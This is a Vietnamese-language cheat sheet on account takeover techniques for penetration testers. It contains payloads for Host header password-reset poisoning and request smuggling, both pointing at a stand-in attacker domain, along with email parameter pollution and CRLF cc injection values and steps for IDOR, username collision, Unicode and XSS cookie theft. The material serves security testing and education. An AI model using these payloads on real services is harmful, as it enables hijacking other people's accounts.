# Chiếm quyền tài khoản (Account Takeover)

> Chiếm quyền tài khoản (Account Takeover - ATO) là một mối đe dọa đáng kể trong lĩnh vực an ninh mạng, liên quan đến việc truy cập trái phép vào tài khoản người dùng thông qua nhiều vector tấn công khác nhau.

## Mục lục

* [Tính năng đặt lại mật khẩu](#password-reset-feature)
    * [Rò rỉ Token đặt lại mật khẩu qua Referrer](#password-reset-token-leak-via-referrer)
    * [Chiếm quyền tài khoản thông qua đầu độc quá trình đặt lại mật khẩu](#account-takeover-through-password-reset-poisoning)
    * [Đặt lại mật khẩu qua tham số Email](#password-reset-via-email-parameter)
    * [IDOR trên các tham số API](#idor-on-api-parameters)
    * [Token đặt lại mật khẩu yếu](#weak-password-reset-token)
    * [Rò rỉ Token đặt lại mật khẩu](#leaking-password-reset-token)
    * [Đặt lại mật khẩu qua xung đột tên người dùng](#password-reset-via-username-collision)
    * [Chiếm quyền tài khoản do lỗi chuẩn hóa Unicode](#account-takeover-due-to-unicode-normalization-issue)
* [Chiếm quyền tài khoản qua các lỗ hổng Web](#account-takeover-via-web-vulnerabilities)
    * [Chiếm quyền tài khoản qua Cross Site Scripting](#account-takeover-via-cross-site-scripting)
    * [Chiếm quyền tài khoản qua HTTP Request Smuggling](#account-takeover-via-http-request-smuggling)
    * [Chiếm quyền tài khoản qua CSRF](#account-takeover-via-csrf)
* [Tài liệu tham khảo](#references)

## Tính năng đặt lại mật khẩu

### Rò rỉ Token đặt lại mật khẩu qua Referrer

1. Yêu cầu đặt lại mật khẩu đến địa chỉ email của bạn
2. Nhấp vào liên kết đặt lại mật khẩu
3. Không đổi mật khẩu
4. Nhấp vào bất kỳ website bên thứ 3 nào (ví dụ: Facebook, twitter)
5. Chặn (intercept) request trong Burp Suite proxy
6. Kiểm tra xem header referer có bị rò rỉ token đặt lại mật khẩu hay không.

### Chiếm quyền tài khoản thông qua đầu độc quá trình đặt lại mật khẩu

1. Chặn request đặt lại mật khẩu trong Burp Suite
2. Thêm hoặc chỉnh sửa các header sau trong Burp Suite: `Host: [ATTACKER.DOMAIN.TLD]`, `X-Forwarded-Host: [ATTACKER.DOMAIN.TLD]`
3. Chuyển tiếp (forward) request với header đã được chỉnh sửa

    ```http
    POST https://example.com/reset.php HTTP/1.1
    Accept: */*
    Content-Type: application/json
    Host: [ATTACKER.DOMAIN.TLD]
    ```

4. Tìm kiếm URL đặt lại mật khẩu dựa trên *host header* như: `https://[ATTACKER.DOMAIN.TLD]/reset-password.php?token=TOKEN`

### Đặt lại mật khẩu qua tham số Email

```powershell
# ô nhiễm tham số (parameter pollution)
email=victim@mail.com&email=hacker@mail.com

# mảng email
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# ký tự phân tách
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### IDOR trên các tham số API

1. Kẻ tấn công phải đăng nhập bằng tài khoản của họ và vào tính năng **Đổi mật khẩu**.
2. Khởi động Burp Suite và chặn request
3. Gửi nó đến tab repeater và chỉnh sửa các tham số: User ID/email

    ```powershell
    POST /api/changepass
    [...]
    ("form": {"email":"victim@email.com","password":"securepwd"})
    ```

### Token đặt lại mật khẩu yếu

Token đặt lại mật khẩu nên được tạo ngẫu nhiên và là duy nhất mỗi lần.
Hãy thử xác định xem token có hết hạn hay không hoặc nó có luôn giống nhau hay không, trong một số trường hợp thuật toán tạo token yếu và có thể bị đoán được. Các biến sau có thể được thuật toán sử dụng.

* Timestamp
* UserID
* Email của người dùng
* Họ và tên
* Ngày sinh
* Mật mã học (Cryptography)
* Chỉ toàn số
* Chuỗi token ngắn (<6 ký tự trong khoảng [A-Z,a-z,0-9])
* Tái sử dụng token
* Ngày hết hạn của token

### Rò rỉ Token đặt lại mật khẩu

1. Kích hoạt một yêu cầu đặt lại mật khẩu thông qua API/UI cho một email cụ thể, ví dụ: <test@mail.com>
2. Kiểm tra phản hồi từ server và tìm `resetToken`
3. Sau đó sử dụng token trong một URL như `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Đặt lại mật khẩu qua xung đột tên người dùng

1. Đăng ký vào hệ thống với một username giống hệt username của nạn nhân, nhưng có chèn thêm khoảng trắng trước và/hoặc sau username. Ví dụ: `"admin "`
2. Yêu cầu đặt lại mật khẩu với username độc hại của bạn.
3. Sử dụng token được gửi đến email của bạn và đặt lại mật khẩu của nạn nhân.
4. Kết nối vào tài khoản của nạn nhân bằng mật khẩu mới.

Nền tảng CTFd đã từng dễ bị tổn thương bởi kiểu tấn công này.
Xem: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Chiếm quyền tài khoản do lỗi chuẩn hóa Unicode

Khi xử lý dữ liệu đầu vào của người dùng có liên quan đến unicode để ánh xạ chữ hoa/thường hoặc chuẩn hóa, có thể xảy ra hành vi không mong muốn.

* Tài khoản nạn nhân: `demo@gmail.com`
* Tài khoản kẻ tấn công: `demⓞ@gmail.com`

[Unisub - công cụ có thể gợi ý các ký tự unicode tiềm năng có thể được chuyển đổi thành một ký tự nhất định](https://github.com/tomnomnom/hacks/tree/master/unisub).

[Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) có thể được sử dụng để tìm danh sách các ký tự unicode phù hợp dựa trên nền tảng.

## Chiếm quyền tài khoản qua các lỗ hổng Web

### Chiếm quyền tài khoản qua Cross Site Scripting

1. Tìm một lỗ hổng XSS bên trong ứng dụng hoặc một subdomain nếu cookie được giới hạn phạm vi (scoped) cho domain cha: `*.domain.com`
2. Rò rỉ **session cookie** hiện tại
3. Xác thực với vai trò người dùng bằng cách sử dụng cookie đó

### Chiếm quyền tài khoản qua HTTP Request Smuggling

Tham khảo trang lỗ hổng **HTTP Request Smuggling**.

1. Sử dụng **smuggler** để phát hiện loại HTTP Request Smuggling (CL, TE, CL.TE)

    ```powershell
    git clone https://github.com/defparam/smuggler.git
    cd smuggler
    python3 smuggler.py -h
    ```

2. Tạo một request sẽ ghi đè lên `POST / HTTP/1.1` với dữ liệu sau:

    ```powershell
    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
    X: 
    ```

3. Request cuối cùng có thể trông giống như sau

    ```powershell
    GET /  HTTP/1.1
    Transfer-Encoding: chunked
    Host: something.com
    User-Agent: Smuggler/v1.0
    Content-Length: 83

    0

    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
    X: X
    ```

Các báo cáo trên Hackerone khai thác lỗi này

* <https://hackerone.com/reports/737140>
* <https://hackerone.com/reports/771666>

### Chiếm quyền tài khoản qua CSRF

1. Tạo một payload cho CSRF, ví dụ: "Form HTML với tự động submit để đổi mật khẩu"
2. Gửi payload

### Chiếm quyền tài khoản qua JWT

JSON Web Token có thể được sử dụng để xác thực người dùng.

* Chỉnh sửa JWT với một User ID / Email khác
* Kiểm tra chữ ký JWT yếu

## Tài liệu tham khảo

* [$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained - August 30, 2020](https://web.archive.org/web/20250701123134/https://www.youtube.com/watch?v=gzM4wWA7RFo)
* [10 Password Reset Flaws - Anugrah SR - September 16, 2020](https://web.archive.org/web/20250626114943/https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
* [Broken Cryptography & Account Takeovers - Harsh Bothra - September 20, 2020](https://web.archive.org/web/20250913121907/https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)
* [CTFd Account Takeover - NIST National Vulnerability Database - March 29, 2020](https://web.archive.org/web/20200329075120/https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
* [Hacking Grindr Accounts with Copy and Paste - Troy Hunt - October 3, 2020](https://web.archive.org/web/20251219192449/https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)
